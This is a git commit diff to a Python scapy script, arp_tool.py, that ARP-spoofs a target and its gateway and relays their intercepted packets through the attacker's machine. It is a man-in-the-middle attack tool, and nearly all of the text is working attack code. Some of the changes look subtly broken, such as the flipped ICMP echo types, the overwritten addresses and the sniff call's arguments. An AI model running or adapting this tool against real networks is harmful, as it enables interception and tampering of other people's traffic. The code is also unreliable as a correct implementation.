6e629587769eb897e706e4c55686af21a0381f76
Ridvan-Okovic <okovic.ridvan@gmail.com>
2023-04-19 22:00:52 +0200

    Modified the script to forward packets that are sent to the gateway through the attacker

--- arp_tool.py
+++ arp_tool.py
@@ -2,7 +2,8 @@ import sys
 import time
 from scapy.layers.l2 import getmacbyip, ARP
 from scapy.sendrecv import send, sniff
-from scapy.layers.inet import IP
+from scapy.layers.inet import IP, ICMP
+
 
 # Define the ARP spoofing function to send fake ARP packets to the target and gateway
 def arp_spoof(target_ip, gateway_ip):
@@ -18,14 +19,19 @@ def arp_spoof(target_ip, gateway_ip):
     send(target_packet, verbose=False)
     send(gateway_packet, verbose=False)
 
+
 # Define the packet forwarding function to forward packets between the target and gateway through our own computer
-def forward_packets(packet):
+def forward_packets(packet, target_ip, gateway_ip, our_ip):
     # Check if the packet is an IP packet
     if packet.haslayer(IP):
         # If the packet was sent by the target to the gateway, forward it through our own computer
         if packet[IP].src == target_ip and packet[IP].dst == gateway_ip:
             # Change the packet's source IP address to our own IP address
             packet[IP].src = our_ip
+
+            # If the packet is an ICMP packet, modify the type to echo reply
+            if packet.haslayer(ICMP):
+                packet[ICMP].type = 0
 
             # Send the packet to the gateway
             send(packet)
@@ -35,11 +41,16 @@ def forward_packets(packet):
             # Change the packet's destination IP address to our own IP address
             packet[IP].dst = our_ip
 
+            # If the packet is an ICMP packet, modify the type to echo request
+            if packet.haslayer(ICMP):
+                packet[ICMP].type = 8
+
             # Send the packet to the target
             send(packet)
 
+
 if __name__ == "__main__":
-        # Check that the script is being used correctly with three arguments (target IP, gateway IP, and our own IP)
+    # Check that the script is being used correctly with three arguments (target IP, gateway IP, and our own IP)
     if len(sys.argv) != 4:
         print("Usage: " + sys.argv[0] + " <target_ip> <gateway_ip> <our_ip>")
         sys.exit(1)
@@ -63,4 +74,6 @@ if __name__ == "__main__":
 
     # Start packet sniffing on the network interface to capture packets between the target and gateway
     print("[+] Starting packet sniffing...")
-    sniff(iface, prn=forward_packets)
+    sniff(
+        iface, prn=lambda packet: forward_packets(packet, target_ip, gateway_ip, our_ip)
+    )
